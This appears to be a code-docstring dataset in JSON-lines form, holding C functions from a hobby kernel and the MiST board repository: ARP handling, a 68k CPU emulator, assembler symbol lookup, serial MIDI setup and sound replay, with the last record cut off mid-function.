{"docstring": "// r/w counter 16 bits, LSB first\n", "func_signal": "void clock_init(void)", "code": "{\n        // \u6ce8\u518c\u65f6\u95f4\u76f8\u5173\u7684\u5904\u7406\u51fd\u6570\n        register_interrupt_handler(IRQ0, clock_callback);\n\n        uint32_t divisor = TIMER_FREQ / FREQUENCY;\n\n        outb(TIMER_MODE, TIMER_SEL0 | TIMER_RATEGEN | TIMER_16BIT);\n\n        // \u62c6\u5206\u4f4e\u5b57\u8282\u548c\u9ad8\u5b57\u8282\n        uint8_t low = (uint8_t)(divisor & 0xFF);\n        uint8_t hign = (uint8_t)((divisor >> 8) & 0xFF);\n        \n        // \u5206\u522b\u5199\u5165\u4f4e\u5b57\u8282\u548c\u9ad8\u5b57\u8282\n        outb(IO_TIMER, low);\n        outb(IO_TIMER, hign);\n}", "path": "arch\\i386\\driver\\clock.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "/* finds unique entry in hashtable */\n", "func_signal": "int find_name(hashtable *ht,char *name,hashdata *result)", "code": "{\n  if(nocase)\n    return find_name_nc(ht,name,result);\n  else{\n    size_t i=hashcode(name)%ht->size;\n    hashentry *p;\n    for(p=ht->entries[i];p;p=p->next){\n      if(!strcmp(name,p->name)){\n        *result=p->data;\n        return 1;\n      }else\n        ht->collisions++;\n    }\n  }\n  return 0;\n}", "path": "tools\\vasm\\symtab.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_arp_arpin(void)", "code": "{\n  \n  if(uip_len < sizeof(struct arp_hdr)) {\n    uip_len = 0;\n    return;\n  }\n  uip_len = 0;\n  \n  switch(BUF->opcode) {\n  case HTONS(ARP_REQUEST):\n    /* ARP request. If it asked for our address, we send out a\n       reply. */\n    if(uip_ipaddr_cmp(BUF->dipaddr, uip_hostaddr)) {\n      /* First, we register the one who made the request in our ARP\n\t table, since it is likely that we will do more communication\n\t with this host in the future. */\n      uip_arp_update(BUF->sipaddr, &BUF->shwaddr);\n      \n      /* The reply opcode is 2. */\n      BUF->opcode = HTONS(2);\n\n      memcpy(BUF->dhwaddr.addr, BUF->shwaddr.addr, 6);\n      memcpy(BUF->shwaddr.addr, uip_ethaddr.addr, 6);\n      memcpy(BUF->ethhdr.src.addr, uip_ethaddr.addr, 6);\n      memcpy(BUF->ethhdr.dest.addr, BUF->dhwaddr.addr, 6);\n      \n      BUF->dipaddr[0] = BUF->sipaddr[0];\n      BUF->dipaddr[1] = BUF->sipaddr[1];\n      BUF->sipaddr[0] = uip_hostaddr[0];\n      BUF->sipaddr[1] = uip_hostaddr[1];\n\n      BUF->ethhdr.type = HTONS(UIP_ETHTYPE_ARP);\n      uip_len = sizeof(struct arp_hdr);\n    }\n    break;\n  case HTONS(ARP_REPLY):\n    /* ARP reply. We insert or update the ARP table if it was meant\n       for us. */\n    if(uip_ipaddr_cmp(BUF->dipaddr, uip_hostaddr)) {\n      uip_arp_update(BUF->sipaddr, &BUF->shwaddr);\n    }\n    break;\n  }\n\n  return;\n}", "path": "tutorials\\soc\\lesson10\\boot_rom\\uip\\uip_arp.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* Access the internals of the CPU */\n", "func_signal": "unsigned int m68k_get_reg(void* context, m68k_register_t regnum)", "code": "{\n\tm68ki_cpu_core* cpu = context != NULL ?(m68ki_cpu_core*)context : &m68ki_cpu;\n\n\tswitch(regnum)\n\t{\n\t\tcase M68K_REG_D0:\treturn cpu->dar[0];\n\t\tcase M68K_REG_D1:\treturn cpu->dar[1];\n\t\tcase M68K_REG_D2:\treturn cpu->dar[2];\n\t\tcase M68K_REG_D3:\treturn cpu->dar[3];\n\t\tcase M68K_REG_D4:\treturn cpu->dar[4];\n\t\tcase M68K_REG_D5:\treturn cpu->dar[5];\n\t\tcase M68K_REG_D6:\treturn cpu->dar[6];\n\t\tcase M68K_REG_D7:\treturn cpu->dar[7];\n\t\tcase M68K_REG_A0:\treturn cpu->dar[8];\n\t\tcase M68K_REG_A1:\treturn cpu->dar[9];\n\t\tcase M68K_REG_A2:\treturn cpu->dar[10];\n\t\tcase M68K_REG_A3:\treturn cpu->dar[11];\n\t\tcase M68K_REG_A4:\treturn cpu->dar[12];\n\t\tcase M68K_REG_A5:\treturn cpu->dar[13];\n\t\tcase M68K_REG_A6:\treturn cpu->dar[14];\n\t\tcase M68K_REG_A7:\treturn cpu->dar[15];\n\t\tcase M68K_REG_PC:\treturn MASK_OUT_ABOVE_32(cpu->pc);\n\t\tcase M68K_REG_SR:\treturn\tcpu->t1_flag\t\t\t\t\t\t|\n\t\t\t\t\t\t\t\t\tcpu->t0_flag\t\t\t\t\t\t|\n\t\t\t\t\t\t\t\t\t(cpu->s_flag << 11)\t\t\t\t\t|\n\t\t\t\t\t\t\t\t\t(cpu->m_flag << 11)\t\t\t\t\t|\n\t\t\t\t\t\t\t\t\tcpu->int_mask\t\t\t\t\t\t|\n\t\t\t\t\t\t\t\t\t((cpu->x_flag & XFLAG_SET) >> 4)\t|\n\t\t\t\t\t\t\t\t\t((cpu->n_flag & NFLAG_SET) >> 4)\t|\n\t\t\t\t\t\t\t\t\t((!cpu->not_z_flag) << 2)\t\t\t|\n\t\t\t\t\t\t\t\t\t((cpu->v_flag & VFLAG_SET) >> 6)\t|\n\t\t\t\t\t\t\t\t\t((cpu->c_flag & CFLAG_SET) >> 8);\n\t\tcase M68K_REG_SP:\treturn cpu->dar[15];\n\t\tcase M68K_REG_USP:\treturn cpu->s_flag ? cpu->sp[0] : cpu->dar[15];\n\t\tcase M68K_REG_ISP:\treturn cpu->s_flag && !cpu->m_flag ? cpu->dar[15] : cpu->sp[4];\n\t\tcase M68K_REG_MSP:\treturn cpu->s_flag && cpu->m_flag ? cpu->dar[15] : cpu->sp[6];\n\t\tcase M68K_REG_SFC:\treturn cpu->sfc;\n\t\tcase M68K_REG_DFC:\treturn cpu->dfc;\n\t\tcase M68K_REG_VBR:\treturn cpu->vbr;\n\t\tcase M68K_REG_CACR:\treturn cpu->cacr;\n\t\tcase M68K_REG_CAAR:\treturn cpu->caar;\n\t\tcase M68K_REG_PREF_ADDR:\treturn cpu->pref_addr;\n\t\tcase M68K_REG_PREF_DATA:\treturn cpu->pref_data;\n\t\tcase M68K_REG_PPC:\treturn MASK_OUT_ABOVE_32(cpu->ppc);\n\t\tcase M68K_REG_IR:\treturn cpu->ir;\n\t\tcase M68K_REG_CPU_TYPE:\n\t\t\tswitch(cpu->cpu_type)\n\t\t\t{\n\t\t\t\tcase CPU_TYPE_000:\t\treturn (unsigned int)M68K_CPU_TYPE_68000;\n\t\t\t\tcase CPU_TYPE_010:\t\treturn (unsigned int)M68K_CPU_TYPE_68010;\n\t\t\t\tcase CPU_TYPE_EC020:\treturn (unsigned int)M68K_CPU_TYPE_68EC020;\n\t\t\t\tcase CPU_TYPE_020:\t\treturn (unsigned int)M68K_CPU_TYPE_68020;\n\t\t\t}\n\t\t\treturn M68K_CPU_TYPE_INVALID;\n\t\tdefault:\t\t\treturn 0;\n\t}\n\treturn 0;\n}", "path": "tests\\tg68k\\Musashi\\m68kcpu.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* same as above, but uses len instead of zero-terminated string */\n", "func_signal": "int find_namelen(hashtable *ht,char *name,int len,hashdata *result)", "code": "{\n  if(nocase)\n    return find_namelen_nc(ht,name,len,result);\n  else{\n    size_t i=hashcodelen(name,len)%ht->size;\n    hashentry *p;\n    for(p=ht->entries[i];p;p=p->next){\n      if(!strncmp(name,p->name,len)&&p->name[len]==0){\n        *result=p->data;\n        return 1;\n      }else\n        ht->collisions++;\n    }\n  }\n  return 0;\n}", "path": "tools\\vasm\\symtab.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* Change the timeslice */\n", "func_signal": "void m68k_modify_timeslice(int cycles)", "code": "{\n\tm68ki_initial_cycles += cycles;\n\tADD_CYCLES(cycles);\n}", "path": "tests\\tg68k\\Musashi\\m68kcpu.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* same as above, but uses len instead of zero-terminated string */\n", "func_signal": "int find_namelen_nc(hashtable *ht,char *name,int len,hashdata *result)", "code": "{\n  size_t i=hashcodelen_nc(name,len)%ht->size;\n  hashentry *p;\n  for(p=ht->entries[i];p;p=p->next){\n    if(!strnicmp(name,p->name,len)&&p->name[len]==0){\n      *result=p->data;\n      return 1;\n    }else\n      ht->collisions++;\n  }\n  return 0;\n}", "path": "tools\\vasm\\symtab.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* Set the CPU type. */\n", "func_signal": "void m68k_set_cpu_type(unsigned int cpu_type)", "code": "{\n\tswitch(cpu_type)\n\t{\n\t\tcase M68K_CPU_TYPE_68000:\n\t\t\tCPU_TYPE         = CPU_TYPE_000;\n\t\t\tCPU_ADDRESS_MASK = 0x00ffffff;\n\t\t\tCPU_SR_MASK      = 0xa71f; /* T1 -- S  -- -- I2 I1 I0 -- -- -- X  N  Z  V  C  */\n\t\t\tCYC_INSTRUCTION  = m68ki_cycles[0];\n\t\t\tCYC_EXCEPTION    = m68ki_exception_cycle_table[0];\n\t\t\tCYC_BCC_NOTAKE_B = -2;\n\t\t\tCYC_BCC_NOTAKE_W = 2;\n\t\t\tCYC_DBCC_F_NOEXP = -2;\n\t\t\tCYC_DBCC_F_EXP   = 2;\n\t\t\tCYC_SCC_R_FALSE  = 2;\n\t\t\tCYC_MOVEM_W      = 2;\n\t\t\tCYC_MOVEM_L      = 3;\n\t\t\tCYC_SHIFT        = 1;\n\t\t\tCYC_RESET        = 132;\n\t\t\treturn;\n\t\tcase M68K_CPU_TYPE_68010:\n\t\t\tCPU_TYPE         = CPU_TYPE_010;\n\t\t\tCPU_ADDRESS_MASK = 0x00ffffff;\n\t\t\tCPU_SR_MASK      = 0xa71f; /* T1 -- S  -- -- I2 I1 I0 -- -- -- X  N  Z  V  C  */\n\t\t\tCYC_INSTRUCTION  = m68ki_cycles[1];\n\t\t\tCYC_EXCEPTION    = m68ki_exception_cycle_table[1];\n\t\t\tCYC_BCC_NOTAKE_B = -4;\n\t\t\tCYC_BCC_NOTAKE_W = 0;\n\t\t\tCYC_DBCC_F_NOEXP = 0;\n\t\t\tCYC_DBCC_F_EXP   = 6;\n\t\t\tCYC_SCC_R_FALSE  = 0;\n\t\t\tCYC_MOVEM_W      = 2;\n\t\t\tCYC_MOVEM_L      = 3;\n\t\t\tCYC_SHIFT        = 1;\n\t\t\tCYC_RESET        = 130;\n\t\t\treturn;\n\t\tcase M68K_CPU_TYPE_68EC020:\n\t\t\tCPU_TYPE         = CPU_TYPE_EC020;\n\t\t\tCPU_ADDRESS_MASK = 0x00ffffff;\n\t\t\tCPU_SR_MASK      = 0xf71f; /* T1 T0 S  M  -- I2 I1 I0 -- -- -- X  N  Z  V  C  */\n\t\t\tCYC_INSTRUCTION  = m68ki_cycles[2];\n\t\t\tCYC_EXCEPTION    = m68ki_exception_cycle_table[2];\n\t\t\tCYC_BCC_NOTAKE_B = -2;\n\t\t\tCYC_BCC_NOTAKE_W = 0;\n\t\t\tCYC_DBCC_F_NOEXP = 0;\n\t\t\tCYC_DBCC_F_EXP   = 4;\n\t\t\tCYC_SCC_R_FALSE  = 0;\n\t\t\tCYC_MOVEM_W      = 2;\n\t\t\tCYC_MOVEM_L      = 2;\n\t\t\tCYC_SHIFT        = 0;\n\t\t\tCYC_RESET        = 518;\n\t\t\treturn;\n\t\tcase M68K_CPU_TYPE_68020:\n\t\t\tCPU_TYPE         = CPU_TYPE_020;\n\t\t\tCPU_ADDRESS_MASK = 0xffffffff;\n\t\t\tCPU_SR_MASK      = 0xf71f; /* T1 T0 S  M  -- I2 I1 I0 -- -- -- X  N  Z  V  C  */\n\t\t\tCYC_INSTRUCTION  = m68ki_cycles[2];\n\t\t\tCYC_EXCEPTION    = m68ki_exception_cycle_table[2];\n\t\t\tCYC_BCC_NOTAKE_B = -2;\n\t\t\tCYC_BCC_NOTAKE_W = 0;\n\t\t\tCYC_DBCC_F_NOEXP = 0;\n\t\t\tCYC_DBCC_F_EXP   = 4;\n\t\t\tCYC_SCC_R_FALSE  = 0;\n\t\t\tCYC_MOVEM_W      = 2;\n\t\t\tCYC_MOVEM_L      = 2;\n\t\t\tCYC_SHIFT        = 0;\n\t\t\tCYC_RESET        = 518;\n\t\t\treturn;\n\t}\n}", "path": "tests\\tg68k\\Musashi\\m68kcpu.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_arp_out(void)", "code": "{\n  struct arp_entry *tabptr;\n  \n  /* Find the destination IP address in the ARP table and construct\n     the Ethernet header. If the destination IP addres isn't on the\n     local network, we use the default router's IP address instead.\n\n     If not ARP table entry is found, we overwrite the original IP\n     packet with an ARP request for the IP address. */\n\n  /* First check if destination is a local broadcast. */\n  if(uip_ipaddr_cmp(IPBUF->destipaddr, broadcast_ipaddr)) {\n    memcpy(IPBUF->ethhdr.dest.addr, broadcast_ethaddr.addr, 6);\n  } else {\n    /* Check if the destination address is on the local network. */\n    if(!uip_ipaddr_maskcmp(IPBUF->destipaddr, uip_hostaddr, uip_netmask)) {\n      /* Destination address was not on the local network, so we need to\n\t use the default router's IP address instead of the destination\n\t address when determining the MAC address. */\n      uip_ipaddr_copy(ipaddr, uip_draddr);\n    } else {\n      /* Else, we use the destination IP address. */\n      uip_ipaddr_copy(ipaddr, IPBUF->destipaddr);\n    }\n      \n    for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {\n      tabptr = &arp_table[i];\n      if(uip_ipaddr_cmp(ipaddr, tabptr->ipaddr)) {\n\tbreak;\n      }\n    }\n\n    if(i == UIP_ARPTAB_SIZE) {\n      /* The destination address was not in our ARP table, so we\n\t overwrite the IP packet with an ARP request. */\n\n      memset(BUF->ethhdr.dest.addr, 0xff, 6);\n      memset(BUF->dhwaddr.addr, 0x00, 6);\n      memcpy(BUF->ethhdr.src.addr, uip_ethaddr.addr, 6);\n      memcpy(BUF->shwaddr.addr, uip_ethaddr.addr, 6);\n    \n      uip_ipaddr_copy(BUF->dipaddr, ipaddr);\n      uip_ipaddr_copy(BUF->sipaddr, uip_hostaddr);\n      BUF->opcode = HTONS(ARP_REQUEST); /* ARP request. */\n      BUF->hwtype = HTONS(ARP_HWTYPE_ETH);\n      BUF->protocol = HTONS(UIP_ETHTYPE_IP);\n      BUF->hwlen = 6;\n      BUF->protolen = 4;\n      BUF->ethhdr.type = HTONS(UIP_ETHTYPE_ARP);\n\n      uip_appdata = &uip_buf[UIP_TCPIP_HLEN + UIP_LLH_LEN];\n    \n      uip_len = sizeof(struct arp_hdr);\n      return;\n    }\n\n    /* Build an ethernet header. */\n    memcpy(IPBUF->ethhdr.dest.addr, tabptr->ethaddr.addr, 6);\n  }\n  memcpy(IPBUF->ethhdr.src.addr, uip_ethaddr.addr, 6);\n  \n  IPBUF->ethhdr.type = HTONS(UIP_ETHTYPE_IP);\n\n  uip_len += sizeof(struct uip_eth_hdr);\n}", "path": "tutorials\\soc\\lesson10\\boot_rom\\uip\\uip_arp.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "// bresenham algorithm to draw a line\n", "func_signal": "void draw_line(unsigned char x, unsigned char y, \n               unsigned char x2, unsigned char y2, \n               unsigned char color)", "code": "{\n  unsigned char longest, shortest, numerator, i;\n  char dx1 = (x<x2)?1:-1;\n  char dy1 = (y<y2)?1:-1;\n  char dx2, dy2;\n  \n  longest = abs(x2 - x);\n  shortest = abs(y2 - y);\n  if(longest<shortest) {\n    longest = abs(y2 - y);\n    shortest = abs(x2 - x);\n    dx2 = 0;            \n    dy2 = dy1;\n  } else {\n    dx2 = dx1;\n    dy2 = 0;\n  }\n\n  numerator = longest/2;\n  for(i=0;i<=longest;i++) {\n    put_pixel(x,y,color) ;\n    if(numerator >= longest-shortest) {\n      numerator += shortest ;\n      numerator -= longest ;\n      x += dx1;\n      y += dy1;\n    } else {\n      numerator += shortest ;\n      x += dx2;\n      y += dy2;\n    }\n  }\n}", "path": "tutorials\\soc\\lesson9\\boot_rom.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static u8_t\nhttpd_fs_strcmp(const char *str1, const char *str2)", "code": "{\n  u8_t i;\n  i = 0;\n loop:\n\n  if(str2[i] == 0 ||\n     str1[i] == '\\r' ||\n     str1[i] == '\\n') {\n    return 0;\n  }\n\n  if(str1[i] != str2[i]) {\n    return 1;\n  }\n\n\n  ++i;\n  goto loop;\n}", "path": "tutorials\\soc\\lesson10\\boot_rom\\uip\\httpd-fs.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* Pulse the RESET line on the CPU */\n", "func_signal": "void m68k_pulse_reset(void)", "code": "{\n\t/* Clear all stop levels and eat up all remaining cycles */\n\tCPU_STOPPED = 0;\n\tSET_CYCLES(0);\n\n\tCPU_RUN_MODE = RUN_MODE_BERR_AERR_RESET;\n\n\t/* Turn off tracing */\n\tFLAG_T1 = FLAG_T0 = 0;\n\tm68ki_clear_trace();\n\t/* Interrupt mask to level 7 */\n\tFLAG_INT_MASK = 0x0700;\n\t/* Reset VBR */\n\tREG_VBR = 0;\n\t/* Go to supervisor mode */\n\tm68ki_set_sm_flag(SFLAG_SET | MFLAG_CLEAR);\n\n\t/* Invalidate the prefetch queue */\n#if M68K_EMULATE_PREFETCH\n\t/* Set to arbitrary number since our first fetch is from 0 */\n\tCPU_PREF_ADDR = 0x1000;\n#endif /* M68K_EMULATE_PREFETCH */\n\n\t/* Read the initial stack pointer and program counter */\n\tm68ki_jump(0);\n\tREG_SP = m68ki_read_imm_32();\n\tREG_PC = m68ki_read_imm_32();\n\tm68ki_jump(REG_PC);\n\n\tCPU_RUN_MODE = RUN_MODE_NORMAL;\n}", "path": "tests\\tg68k\\Musashi\\m68kcpu.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/**\n * Periodic ARP processing function.\n *\n * This function performs periodic timer processing in the ARP module\n * and should be called at regular intervals. The recommended interval\n * is 10 seconds between the calls.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nuip_arp_timer(void)", "code": "{\n  struct arp_entry *tabptr;\n  \n  ++arptime;\n  for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {\n    tabptr = &arp_table[i];\n    if((tabptr->ipaddr[0] | tabptr->ipaddr[1]) != 0 &&\n       arptime - tabptr->time >= UIP_ARP_MAXAGE) {\n      memset(tabptr->ipaddr, 0, 4);\n    }\n  }\n\n}", "path": "tutorials\\soc\\lesson10\\boot_rom\\uip\\uip_arp.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* finds unique entry in hashtable - case insensitive */\n", "func_signal": "int find_name_nc(hashtable *ht,char *name,hashdata *result)", "code": "{\n  size_t i=hashcode_nc(name)%ht->size;\n  hashentry *p;\n  for(p=ht->entries[i];p;p=p->next){\n    if(!stricmp(name,p->name)){\n      *result=p->data;\n      return 1;\n    }else\n      ht->collisions++;\n  }\n  return 0;\n}", "path": "tools\\vasm\\symtab.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* Execute some instructions until we use up num_cycles clock cycles */\n/* ASG: removed per-instruction interrupt checks */\n", "func_signal": "int m68k_execute(int num_cycles)", "code": "{\n\t/* Make sure we're not stopped */\n\tif(!CPU_STOPPED)\n\t{\n\t\t/* Set our pool of clock cycles available */\n\t\tSET_CYCLES(num_cycles);\n\t\tm68ki_initial_cycles = num_cycles;\n\n\t\t/* ASG: update cycles */\n\t\tUSE_CYCLES(CPU_INT_CYCLES);\n\t\tCPU_INT_CYCLES = 0;\n\n\t\t/* Return point if we had an address error */\n\t\tm68ki_set_address_error_trap(); /* auto-disable (see m68kcpu.h) */\n\n\t\t/* Main loop.  Keep going until we run out of clock cycles */\n\t\tdo\n\t\t{\n\t\t\t/* Set tracing accodring to T1. (T0 is done inside instruction) */\n\t\t\tm68ki_trace_t1(); /* auto-disable (see m68kcpu.h) */\n\n\t\t\t/* Set the address space for reads */\n\t\t\tm68ki_use_data_space(); /* auto-disable (see m68kcpu.h) */\n\n\t\t\t/* Call external hook to peek at CPU */\n\t\t\tm68ki_instr_hook(); /* auto-disable (see m68kcpu.h) */\n\n\t\t\t/* Record previous program counter */\n\t\t\tREG_PPC = REG_PC;\n\n\t\t\t/* Read an instruction and call its handler */\n\t\t\tREG_IR = m68ki_read_imm_16();\n\t\t\tm68ki_instruction_jump_table[REG_IR]();\n\t\t\tUSE_CYCLES(CYC_INSTRUCTION[REG_IR]);\n\n\t\t\t/* Trace m68k_exception, if necessary */\n\t\t\tm68ki_exception_if_trace(); /* auto-disable (see m68kcpu.h) */\n\t\t} while(GET_CYCLES() > 0);\n\n\t\t/* set previous PC to current PC for the next entry into the loop */\n\t\tREG_PPC = REG_PC;\n\n\t\t/* ASG: update cycles */\n\t\tUSE_CYCLES(CPU_INT_CYCLES);\n\t\tCPU_INT_CYCLES = 0;\n\n\t\t/* return how many clocks we used */\n\t\treturn m68ki_initial_cycles - GET_CYCLES();\n\t}\n\n\t/* We get here if the CPU is stopped or halted */\n\tSET_CYCLES(0);\n\tCPU_INT_CYCLES = 0;\n\n\treturn num_cycles;\n}", "path": "tests\\tg68k\\Musashi\\m68kcpu.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* floating point conversion routines */\n", "func_signal": "static void conv2single(unsigned char *buf,long double f)", "code": "{\n  union {\n    float sp;\n    uint32_t x;\n  } conv;\n\n  conv.sp = (float)f;\n  buf[0] = (conv.x >> 24) & 0xff;\n  buf[1] = (conv.x >> 16) & 0xff;\n  buf[2] = (conv.x >> 8) & 0xff;\n  buf[3] = conv.x & 0xff;\n}", "path": "tools\\vasm\\cpus\\m68k\\cpu.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* --------------------------------------------------------------------- */\n// Main program\n", "func_signal": "main(int argc, char** argv)", "code": "{\n\t//arguments arguments;\n\tstruct termios oldtio, newtio;\n\tstruct serial_struct ser_info;\n\tchar* modem_device = \"/dev/ttyS0\";\n\tsnd_seq_t *seq;\n\n\targ_set_defaults(&arguments);\n\targp_parse(&argp, argc, argv, 0, 0, &arguments);\n\n\t/*\n\t * Open MIDI output port\n\t */\n\n\tport_out_id = open_seq(&seq);\n\n\t/* \n\t *  Open modem device for reading and not as controlling tty because we don't\n\t *  want to get killed if linenoise sends CTRL-C.\n\t */\n\t\n\tserial = open(arguments.serialdevice, O_RDWR | O_NOCTTY ); \n\n\tif (serial < 0) \n\t{\n\t\tperror(arguments.serialdevice); \n\t\texit(-1); \n\t}\n\n\t/* save current serial port settings */\n\ttcgetattr(serial, &oldtio); \n\n\t/* clear struct for new port settings */\n\tbzero(&newtio, sizeof(newtio)); \n\n\t/* \n\t * BAUDRATE : Set bps rate. You could also use cfsetispeed and cfsetospeed.\n\t * CRTSCTS  : output hardware flow control (only used if the cable has\n\t * all necessary lines. See sect. 7 of Serial-HOWTO)\n\t * CS8      : 8n1 (8bit, no parity, 1 stopbit)\n\t * CLOCAL   : local connection, no modem contol\n\t * CREAD    : enable receiving characters\n\t */\n\tnewtio.c_cflag = arguments.baudrate | CS8 | CLOCAL | CREAD; // CRTSCTS removed\n\n\t/*\n\t * IGNPAR  : ignore bytes with parity errors\n\t * ICRNL   : map CR to NL (otherwise a CR input on the other computer\n\t * will not terminate input)\n\t * otherwise make device raw (no other input processing)\n\t */\n\tnewtio.c_iflag = IGNPAR;\n\n\t/* Raw output */\n\tnewtio.c_oflag = 0;\n\n\t/*\n\t * ICANON  : enable canonical input\n\t * disable all echo functionality, and don't send signals to calling program\n\t */\n\tnewtio.c_lflag = 0; // non-canonical\n\n\t/* \n\t * set up: we'll be reading 4 bytes at a time.\n\t */\n\tnewtio.c_cc[VTIME]    = 0;     /* inter-character timer unused */\n\tnewtio.c_cc[VMIN]     = 1;     /* blocking read until n character arrives */\n\n\t/* \n\t * now clean the modem line and activate the settings for the port\n\t */\n\ttcflush(serial, TCIFLUSH);\n\ttcsetattr(serial, TCSANOW, &newtio);\n\n\t// Linux-specific: enable low latency mode (FTDI \"nagling off\")\n//\tioctl(serial, TIOCGSERIAL, &ser_info);\n//\tser_info.flags |= ASYNC_LOW_LATENCY;\n//\tioctl(serial, TIOCSSERIAL, &ser_info);\n\n\tif (arguments.printonly) \n\t{\n\t\tprintf(\"Super debug mode: Only printing the signal to screen. Nothing else.\\n\");\n\t}\n\n\t/* \n\t * read commands\n\t */\n\n\t/* Starting thread that is polling alsa midi in port */\n\tpthread_t midi_out_thread, midi_in_thread;\n\tint iret1, iret2;\n\trun = TRUE;\n\tiret1 = pthread_create(&midi_out_thread, NULL, read_midi_from_alsa, (void*) seq);\n\t/* And also thread for polling serial data. As serial is currently read in\n           blocking mode, by this we can enable ctrl+c quiting and avoid zombie\n           alsa ports when killing app with ctrl+z */\n\tiret2 = pthread_create(&midi_in_thread, NULL, read_midi_from_serial_port, (void*) seq);\n\tsignal(SIGINT, exit_cli);\n\tsignal(SIGTERM, exit_cli);\n\n\twhile (run)\n\t{   \n\t\tsleep(100);\n\t}\n\n\tvoid* status;\n\tpthread_join(midi_out_thread, &status);\n\n\t/* restore the old port settings */\n\ttcsetattr(serial, TCSANOW, &oldtio);\n\tprintf(\"\\ndone!\\n\");\n}", "path": "tools\\ttymidi\\src\\ttymidi.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "static void\nuip_arp_update(u16_t *ipaddr, struct uip_eth_addr *ethaddr)", "code": "{\n  register struct arp_entry *tabptr;\n  /* Walk through the ARP mapping table and try to find an entry to\n     update. If none is found, the IP -> MAC address mapping is\n     inserted in the ARP table. */\n  for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {\n\n    tabptr = &arp_table[i];\n    /* Only check those entries that are actually in use. */\n    if(tabptr->ipaddr[0] != 0 &&\n       tabptr->ipaddr[1] != 0) {\n\n      /* Check if the source IP address of the incoming packet matches\n         the IP address in this ARP table entry. */\n      if(ipaddr[0] == tabptr->ipaddr[0] &&\n\t ipaddr[1] == tabptr->ipaddr[1]) {\n\t \n\t/* An old entry found, update this and return. */\n\tmemcpy(tabptr->ethaddr.addr, ethaddr->addr, 6);\n\ttabptr->time = arptime;\n\n\treturn;\n      }\n    }\n  }\n\n  /* If we get here, no existing ARP table entry was found, so we\n     create one. */\n\n  /* First, we try to find an unused entry in the ARP table. */\n  for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {\n    tabptr = &arp_table[i];\n    if(tabptr->ipaddr[0] == 0 &&\n       tabptr->ipaddr[1] == 0) {\n      break;\n    }\n  }\n\n  /* If no unused entry is found, we try to find the oldest entry and\n     throw it away. */\n  if(i == UIP_ARPTAB_SIZE) {\n    tmpage = 0;\n    c = 0;\n    for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {\n      tabptr = &arp_table[i];\n      if(arptime - tabptr->time > tmpage) {\n\ttmpage = arptime - tabptr->time;\n\tc = i;\n      }\n    }\n    i = c;\n    tabptr = &arp_table[i];\n  }\n\n  /* Now, i is the ARP table entry which we will fill with the new\n     information. */\n  memcpy(tabptr->ipaddr, ipaddr, 4);\n  memcpy(tabptr->ethaddr.addr, ethaddr->addr, 6);\n  tabptr->time = arptime;\n}", "path": "tutorials\\soc\\lesson10\\boot_rom\\uip\\uip_arp.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "// YM replay is happening in the interrupt\n", "func_signal": "void isr(void) __interrupt", "code": "{\n  BYTE i, *p;\n\n  if(frames) {\n    frames--;\n\n    // write all 14 psg sound registers\n    p = ym_buffer[rsec] + rptr;\n\n    // unrolled loop for min delay between register writes\n    PsgAddrPort = 0; PsgDataPort = *p++;\n    PsgAddrPort = 1; PsgDataPort = *p++;\n    PsgAddrPort = 2; PsgDataPort = *p++;\n    PsgAddrPort = 3; PsgDataPort = *p++;\n    PsgAddrPort = 4; PsgDataPort = *p++;\n    PsgAddrPort = 5; PsgDataPort = *p++;\n    PsgAddrPort = 6; PsgDataPort = *p++;\n    PsgAddrPort = 7; PsgDataPort = *p++;\n    PsgAddrPort = 8; PsgDataPort = *p++;\n    PsgAddrPort = 9; PsgDataPort = *p++;\n    PsgAddrPort = 10; PsgDataPort = *p++;\n    PsgAddrPort = 11; PsgDataPort = *p++;\n    PsgAddrPort = 12; PsgDataPort = *p++;\n    PsgAddrPort = 13;\n    if(*p != 255) PsgDataPort = *p++;\n\n    rptr += 16;\n\n    // one whole sector processed?\n    if(rptr == 512) {\n      rsec++;\n      rptr=0;\n      \n      if(rsec == BUFFERS)\n\trsec = 0;\n    }\n  } else {\n    // not playing? mute all channels\n    for(i=0;i<16;i++) {\n      PsgAddrPort = i;\n      PsgDataPort = 0;\n    }\n  